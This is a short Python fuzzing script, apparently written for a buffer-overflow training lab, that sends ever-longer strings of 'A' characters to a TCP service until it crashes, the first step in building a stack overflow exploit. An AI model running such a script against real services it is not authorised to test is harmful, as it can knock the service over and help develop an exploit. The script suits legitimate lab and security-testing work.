# fuzzer.py

```python
#!/usr/bin/env python3

import socket, time, sys

IP = "MACHINE_IP"

PORT = PORT
TIMEOUT = 5
PREFIX = "OVERFLOW1 "

PAYLOAD_STRING = PREFIX + "A" * 100

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((IP, PORT))

            # if there is banner being received;
            # check with nc to confirm;
            # remove if not needed
            s.recv(1024)

            # sending payload here.
            print("Fuzzing with {} bytes".format(len(PAYLOAD_STRING) - len(PREFIX)))
            s.send(bytes(PAYLOAD_STRING, "latin-1"))
            # s.send((PAYLOAD_STRING.encode()))

            # if there is reply after sending payload;
            # check with nc to confirm;
            # remove if not needed
            s.recv(1024)
    except:
        print("Fuzzing crashed at {} bytes".format(len(PAYLOAD_STRING) - len(PREFIX)))
        sys.exit(0)

    PAYLOAD_STRING += 100 * "A"
    time.sleep(1)
```
